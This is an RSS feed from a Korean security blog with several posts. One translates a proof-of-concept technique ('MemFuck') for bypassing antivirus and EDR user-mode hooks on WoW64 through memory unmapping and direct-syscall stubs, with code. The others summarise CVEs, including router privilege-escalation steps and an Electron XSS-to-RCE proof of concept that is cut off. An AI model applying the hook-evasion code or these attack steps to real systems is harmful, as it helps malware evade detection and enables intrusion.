<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0"
  xmlns:atom="http://www.w3.org/2005/Atom"
  xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>hackyboiz</title>
    <link>https://hackyboiz.github.io/</link>
    
    <atom:link href="https://hackyboiz.github.io/rss2.xml" rel="self" type="application/rss+xml"/>
    
    <description>hack &amp; life</description>
    <pubDate>Sun, 10 Jan 2021 03:19:27 GMT</pubDate>
    <generator>http://hexo.io/</generator>
    
    <item>
      <title>[Translation] MeMFuck: 유저 모드 후킹 우회</title>
      <link>https://hackyboiz.github.io/2021/01/10/idioth/memfuck/</link>
      <guid>https://hackyboiz.github.io/2021/01/10/idioth/memfuck/</guid>
      <pubDate>Sun, 10 Jan 2021 05:00:00 GMT</pubDate>
      
        
        
      <description>&lt;blockquote&gt;
&lt;p&gt;원문 글 : &lt;a href=&quot;https://winternl.com/memfuck/&quot;&gt;MemFuck: Bypassing User-Mode Hooks&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;서문&quot;&gt;&lt;a href=</description>
        
      
      
      
      <content:encoded><![CDATA[<blockquote><p>원문 글 : <a href="https://winternl.com/memfuck/">MemFuck: Bypassing User-Mode Hooks</a></p></blockquote><h2 id="서문"><a href="#서문" class="headerlink" title="서문"></a>서문</h2><p>동적 악성코드 분석은 많은 AV/EDR/MDS에서 악성 프로그램을 탐지하는데 자주 사용하는 방식이다. 동적 분석은 정적 분석과 달리 실행 과정에서 만들어진 윈도우 API 호출을 캡처하고 분석하며 정적 분석보다 탐지율이 높다. system call을 캡처하는  많은 기술이 있지만 가장 많이 사용하는 것은 user-level hook이다. 이러한 hook은 악성 기능을 분석하기 위해 함수 호출을 가로챈다. 임의 실행 파일에서 API 호출의 시퀀스는 다음과 같다.</p><pre><code class="hljs ebnf"><span class="hljs-attribute">OpenProcess</span><span class="hljs-attribute">VirtualAllocEx</span><span class="hljs-attribute">WriteProcessMemory</span><span class="hljs-attribute">CreateRemoteThreadEx</span><span class="hljs-attribute">QueueUserAPC</span><span class="hljs-attribute">NtAlertResumeThread</span></code></pre><p>안티 바이러스들은 호출이나 그 조합을 기반으로 악성 행위를 정의한다. 안티 바이러스의 입장에서 특정한 호출 조합은 코드 인젝션이며 대부분 악의적이거나 원하지 않는 행동으로 판단된다.</p><p>user-mode hook은 안티 바이러스와 NGAV, EDR, sandbox, anti-cheat, DRM 등을 포함한 많은 보안 제품과 툴에서 사용된다. user-mode hook은 구현하기 쉽고, 안정적이고, 간단하며 성능 오버헤드가 적다.</p><p>대부분 user-land hook은 inline hook이며 control flow를 custom handler로 리다이렉트 시키기 위한 대상 함수 rewrite를 포함한다. 핸들러의 내부에서 파라미터들은 보존되고 요청된 함수를 실행하거나 분석할지 결정할 수 있다. 이것들은 잘 문서화되어 있으므로 이러한 개념에 익숙할 것이라고 가정할 것이다.</p><h2 id="32-bit-Hooks"><a href="#32-bit-Hooks" class="headerlink" title="32-bit Hooks"></a>32-bit Hooks</h2><p><img src="/2021/01/10/idioth/memfuck/image0.png"></p><p>32비트 user-land hook이 포함된다. 32비트 유저 모드 보안 제품은 대부분 가능한 깊은 위치에서 hook 하며 ntdll에 대부분의 의심스러운 함수들(NtQueueApcThread 등)이 존재한다. 해결 방법은 system call을 사용하여 원하는 기능을 직접적으로 호출하는 것이다. Ring3 후킹으로 모든 보안 제품을 우회할 수 있다.</p><p>필자는 5년 동안 32비트 윈도우를 접한 경우가 하나도 없으므로 일반적인 경우인 WoW64에서 동작하는 32비트 응용 프로그램에 대해 살펴볼 것이다.</p><h2 id="WoW64에서의-32비트-후킹"><a href="#WoW64에서의-32비트-후킹" class="headerlink" title="WoW64에서의 32비트 후킹"></a>WoW64에서의 32비트 후킹</h2><p><img src="/2021/01/10/idioth/memfuck/image1.png"></p><p>가장 흔한 악성코드의 인스턴스는 Wow64에서 동작하는 32비트 프로그램이다(64비트 머신에서 동작). NGAV와 EDR은 이러한 시나리오에서의 hook 구현이 미흡하다. 대부분 보안 제품은 x86 유저 모드 영역에서만 hook을 한다. user-mode hook을 활용하는 안티바이러스는 WoW64 layer에 hook을 위치하는 것이 좋지만 모든 업체가 그것을 구현하지는 않는다. <a href="https://www.mdsec.co.uk/2020/08/firewalker-a-new-approach-to-generically-bypass-user-space-edr-hooking/">Sophos 우회에 관한 MDSec의 게시글</a>을 보아라.</p><p>많은 보안 제품들이 32비트 프로세스에서 WoW64 실행을 모니터링하지 않는다는 사실은 오랫동안 알려져 있었고 <a href="https://blog.malwarebytes.com/threat-analysis/2018/01/a-coin-miner-with-a-heavens-gate/">악성코드 제작자</a>와 <a href="https://outflank.nl/blog/2019/06/19/red-team-tactics-combining-direct-system-calls-and-srdi-to-bypass-av-edr/">red-team</a>에 의해 공격당했다. 필자가 분석한 악성코드 중에 얼마나 많은 것들이 이를 악용한 <a href="https://github.com/rwfpl/rewolf-wow64ext">rewolf’s wow64ext</a>를 포함하는지 말할 수 없다.</p><h2 id="요약-기존-기술"><a href="#요약-기존-기술" class="headerlink" title="요약 : 기존 기술"></a>요약 : 기존 기술</h2><ul><li>단순히 함수의 Ntdll 버전을 호출하는 것</li><li><a href="https://web.archive.org/web/20190407064851/https://blog.ensilo.com/globeimposter-ransomware-technical">함수의 Wow64 버전을 호출하는 것</a></li><li><a href="https://cdn2.hubspot.net/hubfs/487909/ENSILO%20WHITEPAPER%20ENTER%20THE%20DARK%20GATE.pdf">직접 Syscall 호출</a></li><li>원본 thunk 추적 (<a href="https://www.mdsec.co.uk/2020/08/firewalker-a-new-approach-to-generically-bypass-user-space-edr-hooking/">FireWalker</a>)</li><li><a href="https://blog.malwarebytes.com/threat-analysis/2018/03/hancitor-fileless-attack-with-a-copy-trick/">보조 DLL 매핑</a></li><li>Code splicing (byte stealing)</li></ul><p>모두 잘 작동하고 좋지만 64비트 버전의 ntdll에 위치한 hook에서 동작하지 않을 수 있다. 필자의 관찰에서 이러한 레벨의 hook은 어떤 public 코드로도 본 적이 없고 어떤 안티바이러스도 구현하지 않았다. 몇 가지 존재할 것이라고 확신하지만 보지 못했다.</p><h2 id="MemFuck에-들어가며"><a href="#MemFuck에-들어가며" class="headerlink" title="MemFuck에 들어가며"></a>MemFuck에 들어가며</h2><p>Memfuck은 오직 PoC이며 production code와 유사하지 않다. 즉 필자는 유저 영역에서 가능한 강력한 anti-analysis 기술이라고 생각한다.</p><p>MemFuck은 다른 anti-analysis 방법으로 실험을 시작했다. 본질적으로 가능한 한 비어있는 프로세스를 생성하길 원했으므로 DLL이나 쉘 코드의 수정 없이 보안 제품을 attach 할 수 없었다. 필자는 2008년에 이 <a href="https://gynvael.coldwind.pl/?id=93">게시글</a>을 발견했는데 매우 흥미로웠다. 물론 32비트 윈도우 XP에서 많은 변화가 있었으므로 많은 코드가 호환되지 않지만 대부분의 개념이 존재한다.</p><p><img src="/2021/01/10/idioth/memfuck/image2.png"></p><p>무엇이 ntdll을 필요로 하는가? 모든 결과는 특정한 DLL에 의존하므로 이를 망쳐버리면 어떠한 일이 일어날까</p><h2 id="Unmap-Everything"><a href="#Unmap-Everything" class="headerlink" title="Unmap Everything"></a>Unmap Everything</h2><p>MemFuck은 32비트 주소 영역에서 가능한 모든 것을 unmap 하는 것에 의해 시작된다. 물론 PEB/PEB64, TEB/TEB64와 <a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/ntddk/ns-ntddk-kuser_shared_data">KUSER_SHARED_DATA</a> (작년에 마침내 문서화되었다) 같이 해제가 불가능한 것들도 있다. 이에 대해 몇 가지 방법이 있지만 가능한 귀찮지 않은 방법을 선택하고 싶었다. 우리는 모든 것에 NtUnmapViewOfSection을 호출하는 x86 쉘 코드를 할당할 수 있지만 그렇게 ntdll을 unmap 하면 무슨 일이 일어날까? Ntdll은 자기 자신을 unmap 할 수 없으므로 이 방법은 동작하지 않는다. 다음 단계에서 필자는 code segment switching(Heaven’s Gate)을 통해 직접 syscall 호출을 시험해보았다. 32비트 주소 영역에서 64비트 syscall 실행은 충분히 가능하지만 이 방법은 몇 가지 이유로 이상적이지 않았다.</p><ul><li>32비트 주소 영역에서 코드가 매핑되고 실행되므로 분석하기 쉬울 것이다.</li><li>64비트 주소 영역은 여전히 손상되어 있지 않다.</li><li>이 기술은 user-mode hook을 우회하기 효과적이지만 이미 문서화되어 있다.</li></ul><p>전부는 아니지만 대부분 Ring3 hook을 활용하는 AV/EDR 업체들은 하나의 일반적인 가정을 한다고 생각한다. WoW64 위에서 실행하는 32비트 프로세스는 4GB로 제한된 주소 아래에서 사용자 정의된 코드를 가진다. 따라서 매핑되지 않은 코드를 더 많이 배치하고 기능을 계속할 수 있는 이 제한 이상의 메모리를 할당해보자. Alex Ionescu에 따르면 <a href="https://twitter.com/aionescu/status/677599528409677824?lang=en">이것은 가능하지 않다</a>. 그러나 Petr Benes와 얘기한 후 그는 최근 버전의 윈도우10에서 이러한 제한이 해제되었다고 생각한다. 윈도우10 Build 19041.508에서 테스트했다.</p><p>64비트 버전의 <a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/ntifs/nf-ntifs-ntallocatevirtualmemory">NtAllocateVirtualMemory</a> 호출하기 위해 <a href="https://github.com/rwfpl/rewolf-wow64ext">rewolf’s wow64ext</a>를 사용했다. 필자가 처음 호출을 시도했을 때 혼란스러운 결과를 봤다. BaseAddress 요청이 Null이면 운영체제가 메모리 할당할 위치를 결정한다. 물론 윈도우는 우리가 있어서는 안 되는 곳에 메모리를 할당하는 것을 원하지 않으며 64비트 호출은 32비트 주소 영역에 잘 할당된 메모리를 반환한다. ZeroBit 플래그를 망치는 것은 어떨까? 필자는 ZeroBit 플래그를 조작해서 가능한 높은 주소에 request 하는 방법을 설명하는 <a href="https://stackoverflow.com/questions/50429365/what-is-the-most-reliable-portable-way-to-allocate-memory-at-low-addresses-on">stackoverflow 게시글</a>을 찾았다. 다시 필자는 ZeroBit 플래그를 조작하여 64비트 NtAllocateVirtual request에 MEM_TOP_DOWN 플래그를 추가해보았다. 메모리가 살짝 높긴 하지만 32비트 주소를 만났다. 이 지점에서 매개변수를 조작하는 아이디어를 얻었다. 우리가 원하는 주소를 요청하자! 필자는 BaseAddress를 64비트 주소(많은 메모리와 3개의 DLL)로 설정했고 놀랍게도 그 주소에 할당됐다.</p><p><img src="/2021/01/10/idioth/memfuck/image3.png"></p><p>물론 여기서 우리가 첫 번째로 해야 할 것은 여기에 쉘 코드를 써서 어떠한 행동이 일어나는지 보는 것이다. <a href="https://github.com/jackullrich/ShellcodeStdio">ShellcodeStdio</a>를 사용해서 빠르고 쉽게 64비트 쉘 코드를 작성했다. 이 쉘 코드는 64비트 공간에 할당되고 쓰이며 기본적으로 32비트 유저 모드의 모든 것에 unmap을 시도한다.</p><p>첫 번째 시도에 대한 수도 코드는 아래와 같다.</p><pre><code class="hljs cpp">DEFINE_FUNC_PTR(<span class="hljs-string">&quot;ntdll.dll&quot;</span>, NtUnmapViewOfSection);DEFINE_FUNC_PTR(<span class="hljs-string">&quot;ntdll.dll&quot;</span>, NtProtectVirtualMemory);<span class="hljs-keyword">for</span> (DWORD m = <span class="hljs-number">0</span>; m &lt; <span class="hljs-number">0x80000000</span>; m += <span class="hljs-number">0x1000</span>)    &#123;      PVOID ptrToProtect = (PVOID)m;      ULONG dwBytesToProtect = <span class="hljs-number">1</span>;      ULONG dwOldProt = <span class="hljs-number">0</span>;      NtProtectVirtualMemory((HANDLE)<span class="hljs-number">-1</span>, &amp;ptrToProtect, &amp;dwBytesToProtect, PAGE_READWRITE, &amp;dwOldProt);      NtUnmapViewOfSection((HANDLE)<span class="hljs-number">-1</span>, (PVOID)m);    &#125;</code></pre><p><img src="/2021/01/10/idioth/memfuck/image4.png"></p><p>프로세스가 엉망이다. 그러나 여전히 코드는 실행되고 있으며 잘 동작하고 있다. anti-analysis을 하기에 상당히 좋은 환경이다. 32비트 주소 영역의 완전한 제어를 갖고 우리가 원하는 것을 확실히 로드하고 언로드 할 수 있다. OllyDbg와 x64dbg 같은 많은 디버거들은 여기서 크래시가 나서 분석을 계속하기 위해 Windbg를 사용했다.</p><h2 id="An-Interstring-Intermission"><a href="#An-Interstring-Intermission" class="headerlink" title="An Interstring Intermission"></a>An Interstring Intermission</h2><p>프로세스의 32비트 주소 영역을 완전히 지워버리면서 코드는 의도대로 실행하고 동작하도록 하는 목표에 거의 성공했었다. 여기에는 공격적인 결과와 방어적인 결과가 같이 있다. 아마 이 기간 동안 가장 흥미로운 사실 중 하나는 <a href="https://docs.microsoft.com/en-us/windows/win32/winprog64/exception-handling-under-wow64">MSDN 페이지</a>를 발견했을 때이다.</p><blockquote><p>WOW64는 x86 예외에 대한 전송으로 native x64, ia64 또는 ARM64 예외를 사용한다. 따라서 WOW64에서 동작하는 32비트 응용 프로그램에서 포착되지 않은 예외는 native 64비트 예외처럼 동작한다.</p></blockquote><p>4GB 경계 위의 주소에 64비트 쉘 코드를 쓸 수 있는데, 64비트 공간에 64비트 벡터 예외 처리기(Vectored Exception Handler)를 설치하며 32비트 예외에 의해 트리거 되고 Control Flow가 64bit VEH에 의해 리다이렉션 된다.</p><p><img src="/2021/01/10/idioth/memfuck/image5.png"></p><p>32비트 ntdll이 로드되어 제대로 됐음을 확신했다. 모든 것이 unmap 된 예외를 트리거하는 것은 쉽지만 처리할 WoW64 레이어로 전환할 코드가 없다. 하지만 이 아이디어에는 많은 흥미로운 잠재력이 있다.</p><h2 id="Ntdll-No-More"><a href="#Ntdll-No-More" class="headerlink" title="Ntdll No More"></a>Ntdll No More</h2><p>더 이상 어떤 목적을 위해서든 ntdll에 의존하지 않는다는 원래 개념으로 돌아가서 WoW64 계층에 남은 3개의 dll을 unmapping 하는 일이 남았다. WoW64는 대부분 시스템에서 거의 동일하다.(WoW64.dll, wow64win.dll, ntdll.dll)</p><p><img src="/2021/01/10/idioth/memfuck/image6.png"></p><p>32비트 코드로 돌아가지 않을 것이라고 생각하니 더 이상 필요하지 않은 이 dll들을 unmap 하자.</p><pre><code class="hljs cpp">DWORD64 addrWoW64 = <span class="hljs-number">0</span>;  DWORD64 addrWoW64Win = <span class="hljs-number">0</span>;  DWORD64 addrNtdll = <span class="hljs-number">0</span>;  PPEB peb64 = getPEB();  LIST_ENTRY* first = peb64-&gt;Ldr-&gt;InMemoryOrderModuleList.Flink;  LIST_ENTRY* ptr = first;  <span class="hljs-keyword">int</span> cntr = <span class="hljs-number">0</span>;  <span class="hljs-keyword">do</span> &#123;    LDR_DATA_TABLE_ENTRY* dte = getDataTableEntry(ptr);    ptr = ptr-&gt;Flink;    <span class="hljs-keyword">if</span> (cntr == <span class="hljs-number">1</span>) &#123;      addrNtdll = (DWORD64)dte-&gt;DllBase;    &#125;    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (cntr == <span class="hljs-number">2</span>) &#123;      addrWoW64 = (DWORD64)dte-&gt;DllBase;    &#125;    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (cntr == <span class="hljs-number">3</span>) &#123;      addrWoW64Win = (DWORD64)dte-&gt;DllBase;    &#125;    cntr++;  &#125; <span class="hljs-keyword">while</span> (ptr != first);  NtUnmapViewOfSection(<span class="hljs-number">-1</span>, addrWoW64);  NtUnmapViewOfSection(<span class="hljs-number">-1</span>, addrWoW64Win);</code></pre><p><img src="/2021/01/10/idioth/memfuck/image7.png"></p><p>32비트 주소 공간에 더 이상 hook은 존재하지 않으며 WoW64 dll(Wow64SystemServiceEx 등)에 있는 것도 다 사라졌다. 남은 일은 ntdll을 unmap 하는 것이다. 다시 한번 부모 모듈에서 NtUnmapViewOfSection을 호출하는 문제가 생겼다. 직접 system call을 하자.</p><p>64비트 MSVC 컴파일러가 inline assembly를 제공하지 않으므로 function ordering, 내부 코드 배치 제한으로 인해 system call stub에 새로운 메모리 영역을 할당하기로 결정했다. 윈도우 10 64비트의 Syscall stub은 아래와 같다.</p><pre><code class="hljs x86asm"><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r10</span>, <span class="hljs-built_in">rcx</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">eax</span>, xxh<span class="hljs-keyword">syscall</span><span class="hljs-keyword">retn</span></code></pre><p>NtdllVirtualMemory를 호출하고 DWORD by DWORD로 코드를 작성해라. 그리고 typedef prototype을 할당하면 Nt* 함수를 쉽게 호출할 수 있다.</p><pre><code class="hljs cpp">DWORD dwCode1 = <span class="hljs-number">0xb8d18b4c</span>;  DWORD dwCode2 = <span class="hljs-number">0x0000002a</span>; <span class="hljs-comment">// syscall code for NtUnmapViewOfSection</span>  DWORD dwCode3 = <span class="hljs-number">0x90c3050f</span>;  <span class="hljs-comment">// mov r10, rcx ; 0x4c 0x8b 0xd1</span>  <span class="hljs-comment">// mov eax, xxh ; 0xb8 xx 00 00 00</span>  <span class="hljs-comment">// syscall ; 0x0f 0x05</span>  <span class="hljs-comment">// retn ; 0xc3</span>  *(DWORD*)syscallbase = dwCode1;  *((DWORD*)syscallbase + <span class="hljs-number">1</span>) = dwCode2;  *((DWORD*)syscallbase + <span class="hljs-number">2</span>) = dwCode3;  p_SysUnmapViewOfSection sysUnmap = (p_SysUnmapViewOfSection)syscallbase;</code></pre><p>마지막으로 64비트 ntdll에 대해 NtUnmapViewOfSection의 직접적인 system call 후에 프로세스에는 아무것도 없다. 안티 바이러스가 시도하고 hook 하는 user-mode에 남은 것이 없다. 주입된 DLL이 unmap 된지는 오래됐다.</p><p><img src="/2021/01/10/idioth/memfuck/image8.png"></p><p>여기부터 Rtl* 함수 사용 없이 syscall을 통해 직접 code injection이나 detected code를 실행하는 것이다. 이것을 하면서 WoW64에 관해 많은 것을 배웠고, 한계점과 특이점, 32비트와 64비트 VEH 같은 새로운 탐구 영역을 얻었다.</p><h2 id="Source-Code"><a href="#Source-Code" class="headerlink" title="Source Code"></a>Source Code</h2><p><a href="https://github.com/jackullrich/memfuck">Github 주소</a></p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Translation/">Translation</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/idioth/">idioth</category>
      
      <category domain="https://hackyboiz.github.io/tags/memfuck/">memfuck</category>
      
      <category domain="https://hackyboiz.github.io/tags/hook/">hook</category>
      
      <category domain="https://hackyboiz.github.io/tags/bypass/">bypass</category>
      
      
      <comments>https://hackyboiz.github.io/2021/01/10/idioth/memfuck/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] PsExec 0-day LPE non-official patch</title>
      <link>https://hackyboiz.github.io/2021/01/09/fabu1ous/2021-01-09/</link>
      <guid>https://hackyboiz.github.io/2021/01/09/fabu1ous/2021-01-09/</guid>
      <pubDate>Sat, 09 Jan 2021 09:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://blog.0patch.com/2021/01/local-privilege-escalatio</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://blog.0patch.com/2021/01/local-privilege-escalation-0day-in.html">LPE 0day in PsExec</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Windows xp ~ Windows 10</p><p>PsExec v1.72</p><p>PsExec v2.2</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>PsExec를 사용하는 시스템에서 System 권한을 획득할 수 있는 전형적인 named pipe hijacking <a href="https://hackyboiz.github.io/2020/12/10/idioth/2020-12-10/">취약점</a>이 패치되었습니다. 해커는 PsExec가 기존에 존재하는 named pipe를 재사용할 때 권한 설정을 변경하지 않는다는 점을 악용해 System권한을 갖는 named pipe를 사용할 수 있게 되고 System 권한으로 임의의 프로세스를 생성할 수 있습니다.</p><p>0Patch는 이 취약점에 대한 패치를 공개하고 무료로 배포하고 있습니다. PsExec 서비스는 원격 request를 받아 처리하는 thread를 생성할 때 <code>CreateNamedPipe()</code>를 호출합니다. 0Patch가 공개한 패치에선 <code>CreateNamedPipe()</code>가 호출되기 전 <code>FILE_FLAG_FIRST_PIPE_INSTANCE</code> 플레그 값을 사용해 <code>CreateNamedPipe()</code>를 한 번 더 호출하는 것으로 동일한 이름의 named pipe가 존재하는지 확인합니다. 만약 동일한 이름의 named pipe가 이미 존재하면 Psexesvc.exe를 종료합니다.</p><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a href="https://docs.microsoft.com/en-us/sysinternals/downloads/psexec">https://docs.microsoft.com/en-us/sysinternals/downloads/psexec</a></p><p><a href="https://github.com/tenable/poc/blob/master/Microsoft/Sysinternals/PsExecEscalate.cpp">https://github.com/tenable/poc/blob/master/Microsoft/Sysinternals/PsExecEscalate.cpp</a></p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/Fabu1ous/">Fabu1ous</category>
      
      <category domain="https://hackyboiz.github.io/tags/lpe/">lpe</category>
      
      <category domain="https://hackyboiz.github.io/tags/named-pipe/">named pipe</category>
      
      
      <comments>https://hackyboiz.github.io/2021/01/09/fabu1ous/2021-01-09/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2020-29669 : WIFI SD Hub Privilege Escalation Plugin</title>
      <link>https://hackyboiz.github.io/2021/01/08/l0ch/2021-01-08/</link>
      <guid>https://hackyboiz.github.io/2021/01/08/l0ch/2021-01-08/</guid>
      <pubDate>Fri, 08 Jan 2021 09:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://github.com/code-byter/CVE-2020-29669&quot;&gt;https://git</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://github.com/code-byter/CVE-2020-29669">https://github.com/code-byter/CVE-2020-29669</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Macally WIFISD2-2A82 Travel Router (펌웨어 버전 : 2.000.010)</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>무선 미디어 공유가 가능한 WIFI SD 허브인 Macally WIFISD2-2A82 제품에서 root로 권한 상승이 가능한 취약점이 공개되었습니다.</p><p>취약점의 세부 공격 단계는 아래와 같습니다.</p><ol><li>해커는 웹 인터페이스에서 게스트 계정으로 로그인합니다.</li><li>패스워드 재설정 페이지에서 admin의 패스워드로 설정할 값을 입력합니다.</li><li>BurpSuite로 해당 요청에서 <code>name</code> 필드값을 admin으로 변경해 요청하면 admin의 패스워드가 재설정됩니다.</li><li>telnet을 통해 admin과 재설정한 패스워드를 입력해 접속하면 <code>/etc/passwd</code> 의 root를 포함한 모든 계정의 패스워드 해시를 유출할 수 있습니다.</li></ol><p>해당 취약점을 악용하면 패스워드 해시를 크래킹해 root 쉘에 접근할 수 있습니다.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/cve/">cve</category>
      
      <category domain="https://hackyboiz.github.io/tags/eop/">eop</category>
      
      <category domain="https://hackyboiz.github.io/tags/L0ch/">L0ch</category>
      
      <category domain="https://hackyboiz.github.io/tags/router/">router</category>
      
      <category domain="https://hackyboiz.github.io/tags/wifi-sd/">wifi sd</category>
      
      
      <comments>https://hackyboiz.github.io/2021/01/08/l0ch/2021-01-08/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] SoftMaker Office TextMaker에서 발견된 세 가지 취약점</title>
      <link>https://hackyboiz.github.io/2021/01/07/idioth/2021-01-07/</link>
      <guid>https://hackyboiz.github.io/2021/01/07/idioth/2021-01-07/</guid>
      <pubDate>Thu, 07 Jan 2021 09:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://blog.talosintelligence.com/2021/01/vuln-spotlight</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://blog.talosintelligence.com/2021/01/vuln-spotlight-softmaker-office-textmaker-jan-2021.html?utm_source=feedburner&utm_medium=feed&utm_campaign=Feed:+feedburner/Talos+(Talos%E2%84%A2+Blog)">Vulnerability Spotlight: Multiple vulnerabilities in SoftMaker Office TextMaker</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>SoftMaker Software GmbH SoftMaker Office TextMaker 2021, revision 1014</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>SoftMaker Software GmbH는 오피스 소프트웨어를 개발하는 독일 소프트웨어 회사입니다. 플래그십 제품인 SoftMaker Office는 워드, 스프레드 시트, 프레젠테이션, 스크립트 등등의 기능을 지원합니다. 이 Office 제품군인 TextMaker의 document parsing 기능에서 세 가지 취약점이 발견되었습니다.</p><p><strong>CVE-2020-13544: Sign-extension</strong></p><p>document parser가 record를 parsing 할 때 index table record를 16bit unsigned 값으로 사용하지만 루프 문에서 index를 비교할 때 16bit signed 값으로 사용하여 index table record에 지정된 크기보다 많은 횟수를 반복할 수 있습니다. 따라서 index를 통해 heap 할당 범위 밖에 접근할 수 있습니다.</p><p><strong>CVE-2020-13545: Integer conversion</strong></p><p>document parser가 record를 스캔하고 읽어 올 때 파일 스트림의 현재 위치에서 record에서 사용하는 바이트 크기를 나타내는 32bit integer를 읽어옵니다. 버퍼를 할당할 때 signed multiplication을 사용하지만 버퍼의 끝을 계산할 때 unsigned multiplication을 사용하여 heap 할당 범위 밖의 주소에 접근할 수 있습니다.</p><p><strong>CVE-2020-13546: Integer overflow</strong></p><p>document parser가 record를 parsing 할 때 파일에서 32비트 값을 읽어 <code>0x23c</code>를 곱합니다. 피연산자는 최대 10비트이므로 overflow 되어 32비트로 잘려서 heap에 할당됩니다. 하지만 곱셈 하기 전의 값을 스택에 저장하고 사용하여 할당된 범위 밖에 값이 써지게 됩니다.</p><p>세 가지 취약점 모두 취약점을 트리거하기 위해 해커는 타깃이 문서를 열도록 유도해야 합니다.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/cve/">cve</category>
      
      <category domain="https://hackyboiz.github.io/tags/integer-overflow/">integer overflow</category>
      
      <category domain="https://hackyboiz.github.io/tags/idioth/">idioth</category>
      
      <category domain="https://hackyboiz.github.io/tags/sign-extension/">sign extension</category>
      
      <category domain="https://hackyboiz.github.io/tags/integer-conversion/">integer conversion</category>
      
      
      <comments>https://hackyboiz.github.io/2021/01/07/idioth/2021-01-07/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2020-35717: RCE through XSS</title>
      <link>https://hackyboiz.github.io/2021/01/06/fabu1ous/2021-01-06/</link>
      <guid>https://hackyboiz.github.io/2021/01/06/fabu1ous/2021-01-06/</guid>
      <pubDate>Wed, 06 Jan 2021 09:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://medium.com/bugbountywriteup/remote-code-execution</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://medium.com/bugbountywriteup/remote-code-execution-through-cross-site-scripting-in-electron-f3b891ad637">zonote RCE through XSS</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>zonote &lt;= 0.4.0</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>문서 작성 Electron App인 zonote에서 RCE 취약점이 공개되었습니다. zonote 문서에 마크다운과 html을 삽입해 XSS(Cross-Site-Script) 공격을 할 수 있는데 악용 범위를 RCE까지 확장할 수 있습니다. </p><blockquote><p>It is paramount that you do not enable Node.js integration in any renderer (<code>BrowserWindow</code>, <code>BrowserView</code>, or <code>&lt;webview&gt;</code>) that loads remote content.</p></blockquote><p><a href="https://www.electronjs.org/docs/tutorial/security#2-do-not-enable-nodejs-integration-for-remote-content">Electron의 공식문서</a>에 따르면 원격 콘텐츠에 접근하는 모든 renderer는 Node.js intergration이 비활성화되어있어야 합니다. XSS 취약점이 존재해도 그 악용 범위를 renderer 내부로 제한하기 위해 Electron 5.0.0부터 권장해온 기본 설정입니다. </p><ul><li>다음은 zonote의 main.js코드 일부입니다.</li></ul><pre><code class="hljs js"><span class="hljs-keyword">const</span> browserWindowsOptions = &#123;    ...    webPreference: &#123;        nodeIntergration : <span class="hljs-literal">true</span>,        enableRemoteModule : <span class="hljs-literal">true</span>    &#125;&#125;</code></pre><p>Node.js intergration이 활성화되어있으므로 XSS를 통한 RCE 취약점이 존재합니다.</p><ul><li>PoC</li></ul><pre><code class="hljs markdown"><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">onemouseover</span>=<span 